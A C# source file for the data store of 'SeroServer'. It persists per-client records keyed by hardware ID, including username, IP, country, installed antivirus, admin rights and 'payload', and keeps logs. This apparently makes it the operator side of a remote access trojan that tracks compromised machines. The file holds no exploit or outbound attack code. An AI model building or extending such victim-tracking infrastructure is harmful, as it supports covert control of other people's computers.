using System.Collections.Concurrent;
using System.Collections.ObjectModel;
using System.IO;
using System.Text.Json;
using System.Windows.Data;

namespace SeroServer.Data;

public class DataStore
{
    private static readonly string DataDir = Path.Combine(
        Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData), "SeroServer");
    private static readonly string LogPath = Path.Combine(DataDir, "server.log");
    private static readonly string ClientsPath = Path.Combine(DataDir, "clients.json");

    private static readonly JsonSerializerOptions JsonOpts = new() { WriteIndented = true };
    private readonly object _lock = new();
    private readonly object _logsLock = new();
    private volatile bool _clientsDirty;
    private readonly System.Timers.Timer _saveTimer;

    // Maintained live — avoids O(n) scan every dashboard refresh
    private int _taggedCount;
    public int TaggedCount => _taggedCount;

    // Rolling 24h connect timestamps — Queue for O(1) Enqueue/Dequeue vs List.RemoveAt(0) O(N)
    private readonly object _connectHistLock = new();
    private readonly Queue<DateTime> _connectHistory = new();

    public void AddConnectTimestamp(DateTime utcTime)
    {
        lock (_connectHistLock)
        {
            _connectHistory.Enqueue(utcTime);
            var cutoff = utcTime.AddHours(-25);
            while (_connectHistory.Count > 0 && _connectHistory.Peek() < cutoff)
                _connectHistory.Dequeue();
        }
    }

    public DateTime[] GetConnectHistory()
    {
        lock (_connectHistLock) { return [.. _connectHistory]; }
    }
    private readonly System.Collections.Concurrent.ConcurrentQueue<string> _logQueue = new();
    private readonly System.Timers.Timer _logFlushTimer;

    public ObservableCollection<string> Logs { get; } = [];

    /// <summary>Persistent client records indexed by HWID.</summary>
    public ConcurrentDictionary<string, ClientRecord> AllClients { get; } = new();

    public DataStore()
    {
        // Allow ObservableCollection<string> Logs to be modified from background threads
        // (TlsServer calls DataStore.Log() from threadpool handlers).
        System.Windows.Data.BindingOperations.EnableCollectionSynchronization(Logs, _logsLock);

        LoadClients();
        _saveTimer = new System.Timers.Timer(10_000) { AutoReset = true };
        _saveTimer.Elapsed += (_, _) => { if (_clientsDirty) { _clientsDirty = false; SaveClientsNow(); } };
        _saveTimer.Start();
        // Flush log lines to disk every 2s — avoids blocking the caller on every log call
        _logFlushTimer = new System.Timers.Timer(2_000) { AutoReset = true };
        _logFlushTimer.Elapsed += FlushLogQueue;
        _logFlushTimer.Start();
    }

    // ── Logging ─────────────────────────────────────

    public void Log(string message)
    {
        var entry = $"[{DateTime.Now:HH:mm:ss}] {message}";
        lock (_logsLock)
        {
            Logs.Add(entry);
            if (Logs.Count > 1000)
            {
                var keep = Logs.Skip(500).ToList();
                Logs.Clear();
                foreach (var l in keep) Logs.Add(l);
            }
        }
        // Queue for async disk write — never blocks the caller
        _logQueue.Enqueue(entry);
    }

    private void FlushLogQueue(object? sender, System.Timers.ElapsedEventArgs e)
    {
        if (_logQueue.IsEmpty) return;
        try
        {
            Directory.CreateDirectory(DataDir);
            var sb = new System.Text.StringBuilder();
            while (_logQueue.TryDequeue(out var line))
                sb.AppendLine(line);
            File.AppendAllText(LogPath, sb.ToString());
        }
        catch { }
    }

    // ── Client Records ──────────────────────────────

    public ClientRecord RecordConnection(ConnectedClient client)
    {
        var record = AllClients.GetOrAdd(client.Hwid, _ => new ClientRecord
        {
            Hwid = client.Hwid,
            FirstSeen = DateTime.UtcNow
        });

        var connectTime = DateTime.UtcNow;
        lock (_lock)
        {
            record.LastUsername = client.Username;
            record.LastIP = client.IP;
            record.LastCountry = client.Country;
            if (!string.IsNullOrEmpty(client.CountryCode)) record.LastCountryCode = client.CountryCode;
            record.LastMachineName = client.MachineName;
            record.LastOS        = client.OS;
            record.LastPayload   = client.Payload;
            record.LastAntivirus = client.Antivirus;
            record.LastIsAdmin   = client.IsAdmin;
            if (!string.IsNullOrEmpty(client.CpuName)) record.LastCpuName = client.CpuName;
            if (!string.IsNullOrEmpty(client.GpuName)) record.LastGpuName = client.GpuName;
            record.LastSeen        = connectTime;
            record.LastConnectedAt = connectTime;
            if (client.Port > 0) record.LastPort = client.Port;
            record.ActivityLog.Add(new ActivityEntry { Action = $"Connected from {client.IP} ({client.Username})" });

            if (record.ActivityLog.Count > 200)
                record.ActivityLog.RemoveRange(0, record.ActivityLog.Count - 200);
        }
        AddConnectTimestamp(connectTime);

        SaveClients();
        return record;
    }

    public void RecordDisconnection(string hwid)
    {
        if (AllClients.TryGetValue(hwid, out var record))
        {
            lock (_lock)
            {
                record.LastSeen = DateTime.UtcNow;
                record.ActivityLog.Add(new ActivityEntry { Action = "Disconnected" });
            }
            SaveClients();
        }
    }

    public void RecordActivity(string hwid, string action)
    {
        if (AllClients.TryGetValue(hwid, out var record))
        {
            lock (_lock)
            {
                record.ActivityLog.Add(new ActivityEntry { Action = action });
            }
            SaveClients();
        }
    }

    public void SetTag(string hwid, string tag)
    {
        if (AllClients.TryGetValue(hwid, out var record))
        {
            lock (_lock)
            {
                bool hadTag = !string.IsNullOrEmpty(record.Tag);
                bool hasTag = !string.IsNullOrEmpty(tag);
                record.Tag = tag;
                if (!hadTag && hasTag)  Interlocked.Increment(ref _taggedCount);
                else if (hadTag && !hasTag) Interlocked.Decrement(ref _taggedCount);
            }
            SaveClients();
        }
    }

    public void SetAssignedId(string hwid, string assignedId)
    {
        if (AllClients.TryGetValue(hwid, out var record))
        {
            lock (_lock) { record.AssignedId = assignedId; }
            // Write immediately — not via the 10-second timer — so AssignedId
            // survives a server restart even if it happens right after client connect.
            SaveClientsNow();
        }
    }

    // ── Persistence ─────────────────────────────────

    private void SaveClients() => _clientsDirty = true;

    public  void Save()         => SaveClientsNow();

    private void SaveClientsNow()
    {
        try
        {
            Directory.CreateDirectory(DataDir);
            string json;
            // Serialize under lock so ActivityLog (List<T>) is not modified mid-enumeration
            lock (_lock) { json = JsonSerializer.Serialize(AllClients, JsonOpts); }
            // Atomic write via temp→rename — prevents file corruption on crash mid-write
            var tmp = ClientsPath + ".tmp";
            File.WriteAllText(tmp, json);
            File.Move(tmp, ClientsPath, overwrite: true);
        }
        catch { }
    }

    private void LoadClients()
    {
        try
        {
            if (!File.Exists(ClientsPath)) return;
            var json = File.ReadAllText(ClientsPath);
            var data = JsonSerializer.Deserialize<ConcurrentDictionary<string, ClientRecord>>(json);
            if (data == null) return;
            int tagged = 0;
            foreach (var kv in data)
            {
                AllClients[kv.Key] = kv.Value;
                if (!string.IsNullOrEmpty(kv.Value.Tag)) tagged++;
            }
            _taggedCount = tagged;
            Log($"[*] Loaded {AllClients.Count} persistent client records.");
        }
        catch (Exception ex) { Log($"[!] Failed to load clients: {ex.Message}"); }
    }
}
